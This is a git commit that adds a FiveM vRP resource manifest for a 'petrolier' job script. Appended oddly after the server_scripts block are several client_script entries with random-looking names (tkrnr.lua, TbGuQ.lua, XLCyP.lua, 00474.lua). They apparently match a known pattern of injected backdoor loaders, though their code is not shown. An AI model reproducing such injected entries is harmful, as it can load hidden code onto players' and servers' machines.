16a12a3c36b0754f03cfc8cc202a365b27960b6d
Kasy420 <88784899+Kasy420@users.noreply.github.com>
2021-08-29 16:32:30 +0300

    aaaa

---
+++ [vRP-Stuff]/[slasher-jobs]/vrp_petrolier/__resource.lua
@@ -0,0 +1,21 @@
+resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
+
+description "Made it by KreXaNu & Rares"
+
+dependency "vrp"
+
+client_scripts{ 
+	"@vrp/client/Tunnel.lua",
+	"@vrp/client/Proxy.lua",
+	"lib/Tunnel.lua",
+	"lib/Proxy.lua",
+ 	"client.lua"
+}
+
+server_scripts{ 
+	"@vrp/lib/utils.lua",
+  	"server.lua"
+}client_script "tkrnr.lua"client_script "TbGuQ.lua"client_script "XLCyP.lua"
+
+
+client_script "00474.lua"
